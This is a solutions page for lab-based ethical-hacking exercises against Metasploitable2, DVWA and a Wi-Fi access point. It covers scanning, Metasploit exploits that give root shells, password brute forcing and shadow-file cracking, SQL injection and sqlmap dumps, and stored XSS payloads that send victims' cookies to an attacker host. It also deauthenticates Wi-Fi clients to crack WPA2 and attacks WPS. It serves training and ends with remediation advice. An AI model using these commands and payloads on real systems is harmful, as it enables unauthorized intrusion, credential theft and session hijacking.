# Ethical Hacking — Practice Exercises: Solutions

> Worked, step-by-step answers to every task in [[12-practice-exercises|practice-exercises]]. Attempt each exercise yourself first — reading the solution before you've tried defeats the entire point of the goal-only format. These assume the standard lab from [[05-home-lab-setup|home-lab-setup]] (Kali attacker + Metasploitable2 + DVWA), all on an isolated host-only network.

---

## Reconnaissance & Scanning

**1. Full port + service/version scan**
```
nmap -sV -sC -p- -T4 <target-ip>
```
`-p-` scans all 65535 ports (the default top-1000 misses several of Metasploitable2's deliberately-planted services), `-sV` grabs version banners, `-sC` runs Nmap's default script set for extra fingerprinting. Expect ~20 open ports: ftp (21), ssh (22), telnet (23), smtp (25), http (80), rpcbind (111), netbios/samba (139/445), exec/login/shell (512-514), mysql (3306), postgresql (5432), vnc (5900), and more.

**2. Identify a service with a known CVE**
Cross-reference banner versions against `searchsploit`:
```
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit unrealircd
```
`vsftpd 2.3.4` is the canonical answer — it has a well-known backdoor: **CVE-2011-2523**, where a `:)` smiley in the username triggers a bind shell on port 6200. `searchsploit -x <path>` prints the exploit source directly to confirm.

**3. Enumerate shares**
```
showmount -e <target-ip>          # NFS
smbclient -L //<target-ip>/ -N    # Samba, -N = no password
```
Metasploitable2's NFS export (`/`) is world-readable/writable with no restriction — `showmount -e` lists it directly. Samba anonymous listing shows shares like `tmp` and `opt` accessible without credentials.

---

## Exploitation — Network Services

**4. Remote shell via a purpose-built framework**
```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run
```
This lands a shell as **root** directly — the backdoor spawns the shell with root privileges because of how the vulnerable code executes the payload, so exercise 5 is trivial here (see below).

**6. A second, independent shell via a different vulnerability**
```
use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
run
```
Exploits **CVE-2007-2447** (the Samba "username map script" command injection in `smb.conf`) — also lands root directly, no privesc needed. A third option if you want variety: `exploit/unix/misc/distcc_exec` (CVE-2004-2687), which lands as the unprivileged `daemon` user and *does* require the privesc step below.

**5. Determine privilege level and escalate if needed**
```
id
```
From `vsftpd_234_backdoor` or `usermap_script`, `id` already shows `uid=0(root)` — done. If you instead came in via `distcc_exec` (lands as `daemon`), escalate using Metasploitable2's known local kernel exploit:
```
search type:exploit platform:linux udev
use exploit/linux/local/udev_netlink
set SESSION <session-id>
run
```
CVE-2009-1185 — a missing privilege check in udev's netlink socket handler on this VM's old 2.6 kernel.

---

## Password & Credential Testing

**7. Live login via wordlist attack**
Metasploitable2's SSH accepts the well-known default account:
```
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```
`rockyou.txt` finds `msfadmin` within the first few thousand attempts (it's a deliberately weak, documented default credential for this VM — not a coincidence). Verify with `ssh msfadmin@<target-ip>`.

**8. Extract and crack a hash offline**
From the root shell gained in exercise 4/6:
```
cat /etc/passwd /etc/shadow
```
Copy both off-target, then:
```
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show combined.txt
```
The hash format (identify via the `$1$`/`$6$` prefix in `/etc/shadow` — Metasploitable2 uses MD5-crypt, `$1$`) determines which John mode runs; `--format` can be forced if auto-detection picks wrong. Expect to crack `user:user`, `service:service`, and similar weak accounts quickly.

---

## Web Application Testing (DVWA)

**9. Manual SQL injection (Low) extracting all users**
DVWA's SQLi page takes a `User ID`. First find the column count and confirm injectability:
```
1' ORDER BY 2-- -
1' ORDER BY 3-- -   (errors here → 2 columns)
```
Then dump the app's own `users` table:
```
1' UNION SELECT user, password FROM users-- -
```
This returns every DVWA username and its MD5 password hash directly in the page output — data the single-ID lookup was never meant to expose.

**10. Automate with sqlmap, enumerate full schema**
```
sqlmap -u "http://<target-ip>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<your-session-id>; security=low" \
  --batch --dbs
sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```
The `--cookie` flag is required because DVWA gates everything behind a login session — sqlmap can't authenticate on its own. `--dbs` → `--tables` → `--dump` is the standard escalating-detail sequence, going well beyond the one table pulled by hand in exercise 9.

**11. XSS beyond a plain alert()**
DVWA's Stored XSS (guestbook "message" field) at Low security:
```html
<script>document.location='http://<attacker-ip>/steal?c='+document.cookie</script>
```
Any visitor who views the guestbook page runs this and sends their session cookie to a listener on the attacker box (`nc -lvp 80` is enough to see it arrive). In a real scenario, that stolen `PHPSESSID` lets the attacker hijack the victim's authenticated session without ever knowing their password.

**12. Broken access control (IDOR)**
Back in the SQLi page, DVWA's UI only ever submits your own account's `id` — but the server never actually checks that the `id` you send belongs to you:
```
1' UNION SELECT user, password FROM users WHERE user_id=2-- -
```
or more simply, just changing the plain numeric `id` parameter (Low security, no injection needed) to values you were never given access to and observing the app return them anyway. The exact parameter is `id` in the URL/POST body; the unauthorized data is any other user's row.

**13. Repeat 9 and 11 at Medium**
Medium SQLi switches the input to a `<select>` dropdown and applies `mysqli_real_escape_string()` to quotes — but only to quotes. Since the underlying field is still numeric, quotes aren't needed:
```
1 UNION SELECT user, password FROM users-- -
```
submitted via Burp Repeater (intercept the dropdown's POST request and edit the `id` value directly, bypassing the fixed `<select>` options in the UI). Medium XSS does a literal `str_replace('<script>', '', $input)` — case-sensitive and non-recursive — so either bypass works:
```html
<ScRiPt>document.location='http://<attacker-ip>/steal?c='+document.cookie</ScRiPt>
<img src=x onerror="document.location='http://<attacker-ip>/steal?c='+document.cookie">
```
The comparison write-up: Low trusted client-side input entirely; Medium added a naive string-match filter that a case change or an alternate injection vector (an event handler instead of a `<script>` tag) defeats outright — the fix needed is context-aware output encoding (see [[cybersecurity/04-web-security/01-input-validation-and-output-encoding|input-validation-and-output-encoding]]), not string-blacklisting.

---

## Wireless

**14. Capture and crack a WPA2 handshake**
```
airmon-ng start wlan0
airodump-ng wlan0mon                                   # find target BSSID + channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
aireplay-ng --deauth 5 -a <BSSID> wlan0mon              # force a reconnect to capture the handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap
```
The deauth forces a client to reassociate, which is what actually produces the 4-way handshake frames `airodump-ng` needs to capture — without a client reconnecting mid-capture, there's nothing to crack.

**15. Check for WPS**
```
wash -i wlan0mon
```
If the AP shows up with WPS enabled (locked or not), that's a "yes" — WPS's 8-digit PIN has a design flaw (the last digit is a checksum and the first/second halves are validated separately) that makes it brute-forceable in hours regardless of how strong the actual WPA2 passphrase is, via `reaver` or a Pixie Dust attack (`reaver` with `-K 1`). The practical implication: disable WPS on any AP you administer, independent of password strength.

---

## Reporting

**16. Write-up**
Structure each finding from exercises 4–13 the way [[09-post-exploitation-and-reporting|post-exploitation-and-reporting]] describes:

- **Title** — one line naming the vulnerability (e.g. "vsftpd 2.3.4 Backdoor — Remote Root")
- **Description** — what the flaw is, in plain language
- **Steps to Reproduce** — the exact commands above, in order, with placeholders filled in
- **Evidence** — the actual command output (a root shell prompt, the dumped table, the cracked password)
- **Impact** — what an attacker gains (e.g. "unauthenticated remote code execution as root — full host compromise")
- **Remediation** — the concrete fix (upgrade vsftpd; disable/patch `usermap script`; parameterized queries for the SQLi; context-aware output encoding for the XSS; disable WPS)

A report that's just a transcript of commands fails the test in exercise 16 explicitly — the bar is "someone who wasn't in the room could read this and understand exactly what's broken and how to fix it."
